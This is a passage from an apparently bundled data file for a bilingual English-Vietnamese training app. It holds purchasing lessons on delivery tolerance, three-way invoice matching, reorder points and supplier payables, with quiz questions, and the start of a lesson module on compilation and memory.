+ Delivery 2 ████████████████░░░░  800

Received     800 of 1,000
Open qty     200 (still expected)
PO status    Partially received`},{type:"text",text:`Suppliers rarely deliver the exact amount. A **tolerance** is the allowed difference, for example ±5%. Inside it, accept. Outside it, a person decides.
VI: Nhà cung cấp hiếm khi giao đúng chính xác số lượng. **Dung sai** là mức chênh lệch cho phép, ví dụ ±5%. Trong mức này thì nhận. Vượt mức thì cần người quyết định.`},{type:"diagram",text:`Ordered 1,000 · tolerance ±5%

   <950     950 to 1,050    >1,050
 ┌───────┬───────────────┬────────┐
 │ under │    accept     │  over  │
 │ ask   │    auto OK    │ block  │
 └───────┴───────────────┴────────┘`},{type:"text",text:`Many items first go to a **QC area** (quality check). Only goods that pass move into usable stock. Rejected goods go back to the supplier.
VI: Nhiều mặt hàng được đưa vào **khu chờ kiểm (QC)** trước. Chỉ hàng đạt mới chuyển vào kho sử dụng. Hàng không đạt được trả lại nhà cung cấp.`},{type:"diagram",text:`Truck → Count → QC ─┬→ Pass → Stock
                    └→ Fail → Return`},{type:"example",title:"Bottled water delivery",text:`We order 1,000 bottles. On Monday 600 arrive, and 20 are broken. The GR shows 600 received, 580 accepted, 20 rejected. Is the open quantity 400 or 420? It depends on whether the supplier replaces the broken ones. Ask the business.
VI: Ta đặt 1.000 chai. Thứ Hai về 600 chai, 20 chai bị vỡ. Phiếu nhập ghi nhận 600, đạt 580, loại 20. Số còn chờ giao là 400 hay 420? Tùy nhà cung cấp có giao bù hàng vỡ không. Phải hỏi nghiệp vụ.`},{type:"list",items:[`Store ordered, received, accepted and rejected quantity separately. One "qty" column is not enough.
VI: Lưu riêng số đặt, số nhận, số đạt và số bị loại. Một cột "số lượng" là không đủ.`,`Unit of measure: the PO says boxes, the warehouse counts pieces. Convert with a fixed factor per item.
VI: Đơn vị tính: đơn hàng ghi thùng, kho đếm chiếc. Quy đổi bằng hệ số cố định cho từng mặt hàng.`,`Over-delivery above the tolerance must be blocked or sent for approval.
VI: Giao vượt dung sai phải bị chặn hoặc chuyển đi duyệt.`,`Close a PO line when the rest will never come. Otherwise it stays open forever.
VI: Đóng dòng đơn khi phần còn lại sẽ không giao nữa. Nếu không, nó sẽ treo mãi.`]}],remember:`Received is not the same as accepted. Store both, and let the tolerance decide what is automatic.
VI: Đã nhận chưa chắc đã đạt. Lưu cả hai, và để dung sai quyết định phần nào được xử lý tự động.`,questions:[{id:"purchasing.receipt.1",kind:"mcq",difficulty:"easy",prompt:`A PO line orders 500 units. Two deliveries of 200 have arrived. What is the line status?
VI: Dòng đơn đặt 500 cái. Đã về hai đợt, mỗi đợt 200. Trạng thái dòng là gì?`,choices:["Fully received","Partially received","Pending approval","Closed"],answer:1,why:`400 of 500 arrived, so 100 are still open. The status stays Partially received until the rest arrives or someone closes the line.
VI: Đã về 400 trên 500, còn 100 chưa giao. Trạng thái là Nhận một phần cho tới khi hàng về đủ hoặc có người đóng dòng.`},{id:"purchasing.receipt.2",kind:"scenario",difficulty:"medium",prompt:`We ordered 1,000. The tolerance is ±5%. The supplier delivers 1,080. What should the system do?
VI: Đặt 1.000, dung sai ±5%. Nhà cung cấp giao 1.080. Hệ thống nên làm gì?`,choices:["Accept all 1,080 automatically, as the supplier sent it","Block it or ask for approval, because it is over 1,050","Accept 1,000 and quietly delete the extra 80","Change the PO to 1,080 without telling anyone"],answer:1,why:`1,080 is 8% over, outside the ±5% tolerance. A person must decide: return the extra, or approve a PO change.
VI: 1.080 là vượt 8%, ngoài dung sai ±5%. Cần người quyết định: trả lại phần thừa hoặc duyệt sửa đơn.`},{id:"purchasing.receipt.3",kind:"debug",difficulty:"hard",prompt:`The stock report shows 20 broken bottles as available. The GR recorded them as rejected. What is the likely bug?
VI: Báo cáo tồn kho hiện 20 chai vỡ là hàng sẵn dùng. Phiếu nhập đã ghi chúng là bị loại. Lỗi khả năng là gì?`,choices:["Stock goes up by received qty, not accepted qty","The PO used the wrong currency for the bottles","The invoice was posted before the goods receipt","The tolerance was set to ±5% instead of ±10%"],answer:0,why:`Only accepted goods should become usable stock. Rejected goods belong in a separate return area.
VI: Chỉ hàng đạt mới được tính vào tồn kho sử dụng. Hàng bị loại phải nằm ở khu chờ trả lại riêng.`},{id:"purchasing.receipt.4",kind:"compare",difficulty:"medium",prompt:`The PO is in boxes of 24. The warehouse scans single pieces. Which design is better?
VI: Đơn hàng ghi theo thùng 24 chiếc. Kho quét từng chiếc. Thiết kế nào tốt hơn?`,choices:["Store a conversion per item: 1 box = 24 pieces","Let the warehouse type any number and fix it later","Ask the supplier to ship single pieces only","Ignore units, because the totals even out"],answer:0,why:`A fixed conversion per item keeps PO, receipt and stock in step. Without it, 10 boxes can become 10 pieces.
VI: Hệ số quy đổi cố định cho từng mặt hàng giữ đơn hàng, phiếu nhập và tồn kho khớp nhau. Không có nó, 10 thùng có thể thành 10 chiếc.`}]},{id:"purchasing.three-way-match",title:"Three-way match · Đối chiếu ba bên",summary:`Pay only for what we ordered and really received.
VI: Chỉ trả tiền cho hàng đã đặt và thực sự đã nhận.`,minutes:5,blocks:[{type:"text",text:`Before paying, compare three documents. The **PO** is what we agreed. The **goods receipt** is what came. The **invoice** is what they bill.
VI: Trước khi trả tiền, so sánh ba chứng từ: **đơn đặt hàng** (đã thỏa thuận gì), **phiếu nhập kho** (đã nhận gì) và **hóa đơn** (bị tính tiền gì).`},{type:"diagram",text:`PO ─────── what we agreed
 │
GR ─────── what really came
 │
Invoice ── what they ask us to pay
 ▼
All three agree? → approve payment
Not agree?       → hold, ask the buyer`},{type:"text",text:`Usually the invoice quantity is checked against the GR. The invoice price is checked against the PO. A small tolerance avoids blocks for tiny rounding differences.
VI: Thường thì số lượng trên hóa đơn được so với phiếu nhập. Đơn giá trên hóa đơn được so với đơn đặt hàng. Một dung sai nhỏ giúp không bị chặn vì lệch làm tròn.`},{type:"diagram",text:`Line: A4 paper (ream)
┌──────────┬──────┬─────┬─────────┐
│          │  PO  │ GR  │ Invoice │
├──────────┼──────┼─────┼─────────┤
│ Qty      │ 100  │ 90  │ 100     │
│ Price    │ 60k  │  -  │ 66k     │
│ Amount   │ 6.0M │  -  │ 6.6M    │
└──────────┴──────┴─────┴─────────┘
Qty:   billed 100, received 90   ✗
Price: 66k vs 60k (+10%)         ✗`},{type:"text",text:`The right amount is 90 × 60,000 = 5,400,000 VND. The invoice asks 6,600,000 VND. Without the match, we overpay 1,200,000 VND. The **price variance** is the price difference times quantity.
VI: Số tiền đúng là 90 × 60.000 = 5.400.000 VND. Hóa đơn đòi 6.600.000 VND. Không đối chiếu thì trả thừa 1.200.000 VND. **Chênh lệch giá** là phần lệch đơn giá nhân số lượng.`},{type:"example",title:"Why it stops fraud",text:`A fake supplier sends invoices for goods nobody ordered. With three-way match, there is no PO and no GR. So the invoice cannot be paid.
VI: Một nhà cung cấp "ma" gửi hóa đơn cho hàng không ai đặt. Khi đối chiếu ba bên, không có đơn đặt hàng và không có phiếu nhập. Vì vậy hóa đơn không thể được thanh toán.`},{type:"code",code:{lang:"sql",text:`-- Invoice lines that do not match
-- (simple version: one invoice per PO line)
SELECT il.InvoiceId, il.PoId, il.PoLineNum,
       il.Qty, pl.ReceivedQty,
       il.UnitPrice, pl.UnitPrice AS PoPrice
FROM InvoiceLine il
JOIN PurchaseOrderLine pl
  ON pl.PoId = il.PoId
 AND pl.LineNum = il.PoLineNum
WHERE il.Qty > pl.ReceivedQty
   OR il.UnitPrice > pl.UnitPrice * 1.02;
-- 1.02 = example price tolerance of 2%`}},{type:"list",items:[`Partial invoices: compare with received quantity minus quantity already invoiced.
VI: Hóa đơn từng phần: so với số đã nhận trừ số đã xuất hóa đơn trước đó.`,`Duplicate invoice: block the same seller tax code, invoice symbol and number.
VI: Hóa đơn trùng: chặn khi trùng mã số thuế người bán, ký hiệu và số hóa đơn.`,`Services have no goods receipt. Use a service acceptance record, or a two-way match.
VI: Dịch vụ không có phiếu nhập kho. Dùng biên bản nghiệm thu, hoặc đối chiếu hai bên.`,`Ask the business: what tolerance is allowed, and who can approve a mismatch?
VI: Hỏi nghiệp vụ: dung sai cho phép là bao nhiêu, và ai được duyệt khi lệch?`]}],remember:`PO = agreed, GR = received, invoice = billed. Pay only when all three agree.
VI: Đơn hàng = đã thỏa thuận, phiếu nhập = đã nhận, hóa đơn = bị tính tiền. Chỉ trả khi cả ba khớp nhau.`,questions:[{id:"purchasing.three-way-match.1",kind:"mcq",difficulty:"easy",prompt:`Which three documents does a three-way match compare?
VI: Đối chiếu ba bên so sánh ba chứng từ nào?`,choices:["Purchase request, quotation, purchase order","Purchase order, goods receipt, supplier invoice","Quotation, supplier invoice, bank statement","Goods receipt, stock count, payment order"],answer:1,why:`It checks what we ordered (PO), what came (GR) and what we are billed (invoice).
VI: Nó kiểm tra hàng đã đặt (đơn đặt hàng), hàng đã về (phiếu nhập) và tiền bị tính (hóa đơn).`},{id:"purchasing.three-way-match.2",kind:"code",difficulty:"medium",prompt:`What does the three-way match find for this line?
VI: Đối chiếu ba bên phát hiện gì ở dòng này?`,code:{lang:"text",text:`         PO      GR     Invoice
Qty      50      50     50
Price    200k    -      230k`},choices:["A quantity mismatch only","Price variance of 1,500,000 VND","Everything matches, so pay","Price variance of 30,000 VND"],answer:1,why:`Quantities match. The price is 30,000 VND higher per unit. Times 50 units, the variance is 1,500,000 VND.
VI: Số lượng khớp. Đơn giá cao hơn 30.000 VND mỗi cái. Nhân 50 cái, chênh lệch là 1.500.000 VND.`},{id:"purchasing.three-way-match.3",kind:"scenario",difficulty:"medium",prompt:`An invoice arrives for an office cleaning service. There is a PO, but no goods receipt, because nothing enters the warehouse. What should the system support?
VI: Hóa đơn dịch vụ vệ sinh văn phòng đến. Có đơn đặt hàng nhưng không có phiếu nhập vì không có hàng vào kho. Hệ thống nên hỗ trợ gì?`,choices:["A service acceptance step, or a two-way match","A fake goods receipt for the cleaning service","Paying all service invoices without any check","Rejecting all invoices that have no stock items"],answer:0,why:`Services have no stock movement. A user confirms the work was done, and that record replaces the goods receipt.
VI: Dịch vụ không có nhập xuất kho. Người dùng xác nhận đã làm xong (nghiệm thu), và biên bản đó thay cho phiếu nhập kho.`},{id:"purchasing.three-way-match.4",kind:"debug",difficulty:"hard",prompt:`The same 50 million VND invoice was paid twice. It was entered once from the e-invoice and once from an emailed PDF. Which check was missing?
VI: Cùng một hóa đơn 50 triệu VND bị trả hai lần. Một lần nhập từ hóa đơn điện tử, một lần từ file PDF gửi qua email. Thiếu kiểm tra nào?`,choices:["A unique check on seller tax code, symbol and number","A check that the invoice total is under 100 million","A check that the PO has at least two lines","A rule that invoices can only arrive by email"],answer:0,why:`An invoice is identified by the seller tax code, the invoice symbol and the number. A unique check on these blocks the second entry.
VI: Một hóa đơn được xác định bởi mã số thuế người bán, ký hiệu và số hóa đơn. Ràng buộc duy nhất trên các trường này chặn lần nhập thứ hai.`},{id:"purchasing.three-way-match.5",kind:"truefalse",difficulty:"easy",prompt:`Three-way match helps stop payments for goods that nobody ordered or received.
VI: Đối chiếu ba bên giúp chặn việc trả tiền cho hàng không ai đặt hoặc không ai nhận.`,choices:["True","False"],answer:0,why:`Without a PO and a GR, the invoice has nothing to match. So it is held instead of paid.
VI: Không có đơn đặt hàng và phiếu nhập, hóa đơn không có gì để khớp. Vì vậy nó bị giữ lại, không được trả.`}]},{id:"purchasing.reorder",title:"When to buy: reorder point · Khi nào mua: điểm đặt hàng lại",summary:`Order before you run out, not after.
VI: Đặt hàng trước khi hết, không phải sau khi hết.`,minutes:5,blocks:[{type:"text",text:`The **reorder point** (ROP) is the stock level that says "order now". The **lead time** is the days from PO to goods in the warehouse.
VI: **Điểm đặt hàng lại** là mức tồn kho báo "đặt hàng ngay". **Lead time** (thời gian chờ hàng) là số ngày từ lúc đặt đến lúc hàng về kho.`},{type:"diagram",text:`Usage 20/day · lead time 5 days

Day 1    ███████████████  300
Day 4    ████████████     240
Day 7    █████████        180
Day 9    ███████          140 ◄ order now
Day 14   ██                40 ◄ goods come
Day 14   + 500 arrive  →  540`},{type:"code",code:{lang:"text",text:`ROP = daily usage × lead time + safety stock
    = 20 × 5 + 40
    = 140 units`}},{type:"text",text:`**Safety stock** is extra stock for bad days, when usage jumps or the truck is late. Without it, any delay means we run out.
VI: **Tồn kho an toàn** là lượng dự phòng cho ngày xấu, khi nhu cầu tăng vọt hoặc xe giao trễ. Không có nó, chỉ cần trễ một chút là hết hàng.`},{type:"text",text:`**MOQ** (minimum order quantity) is the smallest amount a supplier will sell. If we need 120 but the MOQ is 500, we buy 500 or find another supplier.
VI: **MOQ** (số lượng đặt hàng tối thiểu) là lượng nhỏ nhất nhà cung cấp chịu bán. Cần 120 mà MOQ là 500 thì mua 500 hoặc tìm nhà cung cấp khác.`},{type:"code",code:{lang:"ts",text:`function orderQty(need: number, moq: number,
                  packSize: number): number {
  const qty = Math.max(need, moq);
  // round up to full packs
  return Math.ceil(qty / packSize) * packSize;
}
orderQty(120, 500, 24); // 504`}},{type:"example",title:"The lead time grows",text:`A supplier moves production abroad. The lead time goes from 5 to 12 days. If the ROP stays 140, we order too late. The new ROP is 20 × 12 + 40 = 280.
VI: Nhà cung cấp chuyển sản xuất ra nước ngoài. Lead time tăng từ 5 lên 12 ngày. Nếu điểm đặt hàng vẫn là 140, ta sẽ đặt quá muộn. Điểm mới là 20 × 12 + 40 = 280.`},{type:"list",items:[`Count stock already on order. Otherwise the system orders again every day.
VI: Tính cả hàng đang về (đã đặt, chưa nhận). Nếu không, hệ thống ngày nào cũng đặt lại.`,`Store lead time per supplier and item. Ask who keeps it up to date.
VI: Lưu lead time theo từng nhà cung cấp và mặt hàng. Hỏi ai chịu trách nhiệm cập nhật.`,`Daily usage: an average of the last 30 days, or a forecast? Seasonal items need care.
VI: Mức dùng mỗi ngày: trung bình 30 ngày gần nhất hay theo dự báo? Hàng theo mùa cần chú ý.`,`Working days or calendar days? Long holidays like Tet change the real lead time.
VI: Tính ngày làm việc hay ngày lịch? Kỳ nghỉ dài như Tết làm thay đổi lead time thực tế.`]}],remember:`Order when stock reaches daily usage × lead time + safety stock. Count what is already on order.
VI: Đặt hàng khi tồn kho chạm mức dùng mỗi ngày × lead time + tồn kho an toàn. Nhớ tính cả hàng đang về.`,questions:[{id:"purchasing.reorder.1",kind:"mcq",difficulty:"easy",prompt:`Daily usage is 30 units. The lead time is 4 days. Safety stock is 50. What is the reorder point?
VI: Mỗi ngày dùng 30 cái. Lead time 4 ngày. Tồn kho an toàn 50. Điểm đặt hàng lại là bao nhiêu?`,choices:["120","170","150","200"],answer:1,why:`30 × 4 = 120 units are used while we wait. Add 50 safety stock: 170.
VI: Trong lúc chờ hàng dùng hết 30 × 4 = 120 cái. Cộng 50 tồn kho an toàn: 170.`},{id:"purchasing.reorder.2",kind:"debug",difficulty:"medium",prompt:`Every morning a job creates a new PO for the same item. Now 6 POs are open. What is the likely bug?
VI: Sáng nào job cũng tạo đơn mới cho cùng một mặt hàng. Giờ có 6 đơn đang mở. Lỗi khả năng là gì?`,choices:["The check uses stock on hand and ignores open POs","The safety stock is set a little too low","The supplier MOQ is larger than daily usage","The lead time is stored in working days"],answer:0,why:`Stock does not go up until goods arrive. If the job ignores quantities already on order, it orders again and again.
VI: Tồn kho chưa tăng cho tới khi hàng về. Nếu job bỏ qua số đang đặt, nó sẽ đặt lại mãi.`},{id:"purchasing.reorder.3",kind:"scenario",difficulty:"medium",prompt:`The lead time changes from 5 to 10 days. Usage is 20 per day, safety stock is 40. The system still uses ROP 140. What happens?
VI: Lead time đổi từ 5 lên 10 ngày. Mỗi ngày dùng 20, tồn kho an toàn 40. Hệ thống vẫn dùng điểm đặt hàng 140. Chuyện gì xảy ra?`,choices:["We order too late and may run out","We order too early and hold extra stock","Nothing changes, because usage is the same","The supplier sends goods faster to match"],answer:0,why:`The new ROP is 20 × 10 + 40 = 240. Ordering at 140 leaves only 7 days of stock for a 10-day wait.
VI: Điểm mới là 20 × 10 + 40 = 240. Đặt ở mức 140 thì chỉ còn đủ dùng 7 ngày cho 10 ngày chờ.`},{id:"purchasing.reorder.4",kind:"truefalse",difficulty:"medium",prompt:`We need 120 units and the supplier MOQ is 500. The system should send a PO for 120 to that supplier.
VI: Cần 120 cái, MOQ của nhà cung cấp là 500. Hệ thống nên gửi đơn 120 cái cho nhà cung cấp đó.`,choices:["True","False"],answer:1,why:`An order under the MOQ is usually refused. Order at least 500, or pick a supplier with a lower MOQ.
VI: Đơn dưới MOQ thường bị từ chối. Đặt ít nhất 500, hoặc chọn nhà cung cấp có MOQ thấp hơn.`}]},{id:"purchasing.performance-payables",title:"Supplier performance and payables · Đánh giá nhà cung cấp và công nợ phải trả",summary:`Score suppliers, and pay on time: not too early, not too late.
VI: Chấm điểm nhà cung cấp, và trả tiền đúng hạn: không quá sớm, không quá muộn.`,minutes:4,blocks:[{type:"text",text:`Receipt data lets us score suppliers. Two common measures are the **on-time rate** and the **defect rate**.
VI: Dữ liệu nhập kho giúp chấm điểm nhà cung cấp. Hai chỉ số phổ biến là **tỷ lệ giao đúng hạn** và **tỷ lệ hàng lỗi**.`},{type:"diagram",text:`Supplier scorecard (last 3 months)
┌──────────┬─────────────┬───────────┐
│ Supplier │ On-time     │ Defects   │
├──────────┼─────────────┼───────────┤
│ A        │ 18/20 = 90% │ 0.5%      │
│ B        │ 12/20 = 60% │ 6.0%      │
└──────────┴─────────────┴───────────┘
On-time = on-time deliveries / all
Defects = rejected qty / received qty`},{type:"text",text:`IT side: the on-time rate needs a **promised date** on each PO line. If buyers move that date when goods are late, the score lies. Keep the history of date changes.
VI: Góc IT: tỷ lệ đúng hạn cần **ngày hẹn giao** trên từng dòng đơn. Nếu người mua dời ngày khi hàng trễ, điểm sẽ sai. Hãy lưu lịch sử thay đổi ngày.`},{type:"text",text:`An approved invoice becomes **accounts payable** (AP): money we owe. The **due date** is often the invoice date plus the payment terms.
VI: Hóa đơn đã duyệt trở thành **công nợ phải trả**: tiền ta còn nợ. **Hạn thanh toán** thường là ngày hóa đơn cộng số ngày theo điều khoản.`},{type:"diagram",text:`Invoice 100M VND · terms 2/10 net 30

Day 0       Day 10          Day 30
 ├────────────┼───────────────┤
invoice     last day for    due date:
            2% discount:    pay 100M
            pay 98M`},{type:"example",title:"Too early, too late",text:`"2/10 net 30" means: pay within 10 days and get 2% off, or pay in full by day 30. Paying on day 2 without a discount just uses cash early. Paying on day 45 hurts trust, and the supplier may stop deliveries.
VI: "2/10 net 30" nghĩa là trả trong 10 ngày được giảm 2%, hoặc trả đủ trước ngày 30. Trả ngày thứ 2 mà không có chiết khấu chỉ làm mất tiền mặt sớm. Trả ngày 45 làm mất uy tín, nhà cung cấp có thể ngừng giao hàng.`},{type:"list",items:[`Due date from the invoice date or the receipt date? Ask the business.
VI: Hạn trả tính từ ngày hóa đơn hay ngày nhập kho? Phải hỏi nghiệp vụ.`,`Advance payments must be subtracted before we pay the rest.
VI: Khoản đã trả trước phải được trừ trước khi trả phần còn lại.`,`Returned goods lower what we owe. Track them, so we do not pay for them.
VI: Hàng trả lại làm giảm công nợ phải trả. Phải theo dõi để không trả tiền cho số hàng đó.`,`Invoice statuses: Received → Matched → Approved → Scheduled → Paid, or On hold.
VI: Trạng thái hóa đơn: Đã nhận → Đã đối chiếu → Đã duyệt → Đã lên lịch trả → Đã trả, hoặc Tạm giữ.`]}],remember:`Score suppliers from real receipt data. Pay on the due date, or earlier only to get a discount.
VI: Chấm điểm nhà cung cấp từ dữ liệu nhập kho thật. Trả đúng hạn, chỉ trả sớm khi được chiết khấu.`,questions:[{id:"purchasing.performance-payables.1",kind:"mcq",difficulty:"easy",prompt:`Supplier C made 25 deliveries. 20 came on or before the promised date. What is the on-time rate?
VI: Nhà cung cấp C giao 25 lần. 20 lần đến đúng hoặc trước ngày hẹn. Tỷ lệ giao đúng hạn là bao nhiêu?`,choices:["75%","80%","85%","20%"],answer:1,why:`20 on-time deliveries out of 25 is 20 / 25 = 80%.
VI: 20 lần đúng hạn trên 25 lần là 20 / 25 = 80%.`},{id:"purchasing.performance-payables.2",kind:"scenario",difficulty:"medium",prompt:`Terms are 2/10 net 30 on a 200 million VND invoice. We have enough cash. Today is day 8. What is usually the best choice?
VI: Điều khoản 2/10 net 30 cho hóa đơn 200 triệu VND. Công ty đủ tiền mặt. Hôm nay là ngày thứ 8. Lựa chọn nào thường tốt nhất?`,choices:["Pay 196 million now and take the discount","Wait and pay 200 million on day 30","Pay 200 million now, since it is early","Pay half now and half on day 30"],answer:0,why:`Saving 2% for paying about 20 days early is a very high return. With enough cash, taking it is usually right. Paying early without the discount gains nothing.
VI: Tiết kiệm 2% chỉ vì trả sớm khoảng 20 ngày là lợi suất rất cao. Nếu đủ tiền, nên lấy chiết khấu. Trả sớm mà không được giảm thì không lợi gì.`},{id:"purchasing.performance-payables.3",kind:"debug",difficulty:"hard",prompt:`Supplier B always scores 100% on-time, but the warehouse says B is often late. What is the most likely cause?
VI: Nhà cung cấp B luôn đạt 100% đúng hạn, nhưng kho nói B hay giao trễ. Nguyên nhân khả năng cao nhất là gì?`,choices:["Buyers move the promised date when B is late","B sends invoices before the goods arrive","The defect rate uses the rejected quantity","The PO currency for B is USD, not VND"],answer:0,why:`If the promised date moves to match the late delivery, every delivery looks on time. Keep the original date, or a change history.
VI: Nếu ngày hẹn bị dời cho khớp lần giao trễ, lần nào cũng trông như đúng hạn. Hãy giữ ngày hẹn gốc hoặc lịch sử thay đổi.`},{id:"purchasing.performance-payables.4",kind:"truefalse",difficulty:"medium",prompt:`Every company counts the due date from the invoice date, so developers do not need to ask.
VI: Mọi công ty đều tính hạn trả từ ngày hóa đơn, nên lập trình viên không cần hỏi.`,choices:["True","False"],answer:1,why:`Some companies count from the receipt date, or from the day the invoice reached them. It is a business rule, so ask.
VI: Có công ty tính từ ngày nhập kho, hoặc ngày nhận được hóa đơn. Đây là quy tắc nghiệp vụ, nên phải hỏi.`}]}],cheatSheet:[{title:"The flow · Quy trình",items:[{term:"Purchase request · Đề nghị mua hàng",meaning:`Internal ask to buy something.
VI: Yêu cầu mua hàng trong nội bộ.`},{term:"RFQ / Quotation · Yêu cầu báo giá / Báo giá",meaning:`We ask for prices; suppliers answer with an offer.
VI: Ta hỏi giá; nhà cung cấp gửi lại báo giá.`},{term:"Purchase order · Đơn đặt hàng",meaning:`Official, approved order to one supplier.
VI: Lệnh mua chính thức, đã duyệt, gửi một nhà cung cấp.`},{term:"Goods receipt · Phiếu nhập kho",meaning:`What really arrived. Stock goes up here.
VI: Số hàng thực nhận. Tồn kho tăng ở bước này.`},{term:"Supplier invoice · Hóa đơn nhà cung cấp",meaning:`The bill, usually an e-invoice.
VI: Hóa đơn bán hàng của nhà cung cấp, thường là hóa đơn điện tử.`},{term:"Payment · Thanh toán",meaning:`Money paid to the supplier, often by bank transfer.
VI: Trả tiền cho nhà cung cấp, thường bằng chuyển khoản.`}]},{title:"Controls · Kiểm soát",items:[{term:"Approval limit · Hạn mức phê duyệt",meaning:`Who may approve which PO amount, in VND.
VI: Ai được duyệt đơn tới mức tiền nào, tính bằng VND.`},{term:"Approved vendor list · Danh sách NCC được duyệt",meaning:`Only these suppliers may get POs for an item.
VI: Chỉ các nhà cung cấp này được nhận đơn cho mặt hàng đó.`},{term:"Tolerance · Dung sai",meaning:`Allowed difference in quantity or price, for example ±5%.
VI: Mức lệch cho phép về số lượng hoặc giá, ví dụ ±5%.`},{term:"Three-way match · Đối chiếu ba bên",meaning:`PO vs goods receipt vs invoice before paying.
VI: So đơn đặt hàng, phiếu nhập và hóa đơn trước khi trả.`},{term:"Price variance · Chênh lệch giá",meaning:`(Invoice price − PO price) × quantity.
VI: (Giá hóa đơn − giá đơn hàng) × số lượng.`},{term:"Duplicate invoice · Hóa đơn trùng",meaning:`Same seller tax code, symbol and number. Block it.
VI: Trùng mã số thuế người bán, ký hiệu và số. Phải chặn.`}]},{title:"When to buy · Khi nào mua",items:[{term:"Reorder point · Điểm đặt hàng lại",meaning:`Daily usage × lead time + safety stock.
VI: Mức dùng mỗi ngày × lead time + tồn kho an toàn.`},{term:"Safety stock · Tồn kho an toàn",meaning:`Extra stock for late trucks and usage spikes.
VI: Lượng dự phòng cho xe giao trễ và nhu cầu tăng đột biến.`},{term:"Lead time · Thời gian chờ hàng",meaning:`Days from PO to goods in the warehouse.
VI: Số ngày từ lúc đặt hàng đến lúc hàng về kho.`},{term:"MOQ · Số lượng đặt tối thiểu",meaning:`Smallest quantity the supplier will sell.
VI: Số lượng nhỏ nhất nhà cung cấp chịu bán.`},{term:"On order · Hàng đang về",meaning:`Ordered but not received. Count it before ordering again.
VI: Đã đặt nhưng chưa nhận. Phải tính vào trước khi đặt thêm.`}]},{title:"Suppliers and payables · Nhà cung cấp và công nợ",items:[{term:"Supplier master · Danh mục nhà cung cấp",meaning:`Main record: tax code, bank account, terms, status.
VI: Hồ sơ gốc: mã số thuế, tài khoản ngân hàng, điều khoản, trạng thái.`},{term:"Payment terms · Điều khoản thanh toán",meaning:`When we must pay, for example Net 30.
VI: Khi nào phải trả, ví dụ Net 30.`},{term:"Accounts payable · Công nợ phải trả",meaning:`Approved invoices we still owe.
VI: Các hóa đơn đã duyệt mà ta còn nợ.`},{term:"Early payment discount · Chiết khấu thanh toán sớm",meaning:`"2/10 net 30": 2% off if paid within 10 days.
VI: "2/10 net 30": giảm 2% nếu trả trong 10 ngày.`},{term:"On-time rate · Tỷ lệ giao đúng hạn",meaning:`On-time deliveries / all deliveries.
VI: Số lần giao đúng hạn / tổng số lần giao.`},{term:"Defect rate · Tỷ lệ hàng lỗi",meaning:`Rejected quantity / received quantity.
VI: Số lượng bị loại / số lượng đã nhận.`}]}]},oe=Object.freeze(Object.defineProperty({__proto__:null,default:se},Symbol.toStringTag,{value:"Module"})),re={id:"runtime",title:"How Code Runs",emoji:"⚙️",tagline:"Compile, memory, GC, bytes — what really happens when code runs",lessons:[{id:"runtime.compile",title:"From source code to running program",summary:'Compiler, interpreter, JIT — and what "build" really does.',minutes:4,blocks:[{type:"text",text:"Your CPU only understands **machine code**: simple numbered instructions. Your source code must become machine code before it runs. There are three ways to do that."},{type:"list",items:["**Compiler** — translates the code before the program runs.","**Interpreter** — reads the code and runs it step by step, while the program runs.","**JIT** (just-in-time compiler) — compiles code to machine code while the program runs, right before it is needed."]},{type:"diagram",text:`C#
 Program.cs
     │  dotnet build (C# compiler)
     ▼
 App.dll = IL, not machine code yet
     │  app starts on the .NET runtime
     ▼
 JIT compiles each method on first call
     ▼
 machine code → CPU

TypeScript
 app.ts
     │  tsc: check types, then remove them
     ▼
 app.js
     │  Node or browser (V8 engine)
     ▼
 interpret first, JIT the busy code
     ▼
 machine code → CPU`},{type:"text",text:"**IL** (intermediate language) is a CPU-neutral form of your code. The same `.dll` runs on Intel or ARM, Windows or Linux. The .NET runtime JIT-compiles it on the machine where it runs."},{type:"text",text:"**Build** means turning source code into something that can run. It also checks your code. In TypeScript, types exist only at build time. The JavaScript that runs has no types left."},{type:"compare",left:{title:"Compile error",items:["Found before the program runs","Example: wrong type, typo in a name","Cheap: you fix it at your desk"]},right:{title:"Runtime error",items:["Found while the program runs","Example: null value, divide by zero","Costly: a user may hit it first"]}},{type:"code",code:{lang:"ts",text:`type User = { name: string };

// Compile error: tsc stops the build
const a: User = { name: 42 };

// Runtime error: tsc cannot see real data
const b = JSON.parse(text) as User;
b.name.toUpperCase(); // crash if no name`}},{type:"example",title:"The partner API that changed",text:'A shop app reads prices from a partner API. The TypeScript type says `price` is a number. One day the API sends `"12.50"` as a string. The build is still green. Now `price + 1` gives `"12.501"`. Types do not check real data, so validate input from outside.'}],remember:"Build errors are cheap; runtime errors reach users. TypeScript types are gone at runtime, so check outside data.",questions:[{id:"runtime.compile.1",kind:"mcq",difficulty:"easy",prompt:"What does `dotnet build` produce for a normal C# project?",choices:["A .dll with IL that the JIT turns into machine code later","A .dll with final machine code for one CPU type only","A JavaScript file that the V8 engine runs","Nothing on disk; the code is compiled on every run"],answer:0,why:"The C# compiler writes IL into a `.dll`. When the app runs, the JIT compiles each method to machine code for that CPU. Native AOT is an option that compiles ahead of time instead."},{id:"runtime.compile.2",kind:"truefalse",difficulty:"medium",prompt:"TypeScript checks at runtime that a JSON response really matches its declared type.",choices:["True","False"],answer:1,why:"Types are removed when TypeScript becomes JavaScript. `as User` only tells the compiler to trust you. Use a runtime check, for example a schema validator, for outside data.",remember:"Types vanish at runtime."},{id:"runtime.compile.3",kind:"code",difficulty:"medium",prompt:"With default `strict` settings, this TypeScript builds without errors. What happens when it runs?",code:{lang:"ts",text:`const ids: number[] = [];
const first = ids[0];
console.log(first.toFixed(2));`},choices:["It prints 0.00, because an empty slot is 0","It throws a TypeError, because `first` is undefined","It prints NaN, because the array is empty","It cannot run: the build would fail first"],answer:1,why:"Reading past the end of a JavaScript array gives `undefined`, not 0. TypeScript still types `ids[0]` as `number`, so the build passes. The error only appears at runtime."},{id:"runtime.compile.4",kind:"scenario",difficulty:"medium",prompt:'Production crashed with a `NullReferenceException`. A teammate asks: "Why did the build not catch it?" What is the best answer?',choices:["The build checks types and names, not the real values","The build was skipped; a passing build catches every null","The JIT removed the null checks to make the code faster","Release builds hide errors that Debug builds report"],answer:0,why:"The compiler does not know which values will arrive. A null from the database or a request appears only at runtime. Nullable reference types give helpful warnings, but no guarantee.",remember:"A green build is not a bug-free program."}]},{id:"runtime.stack-heap",title:"Stack vs heap",summary:"Where locals live, where objects live, and why deep recursion crashes.",minutes:4,blocks:[{type:"text",text:"A running program keeps data in two main areas of memory. The **stack** holds method calls and their local variables. The **heap** holds objects that can live longer."},{type:"code",code:{lang:"csharp",text:`class Order { public decimal Total; }

decimal Tax(Order o)
{
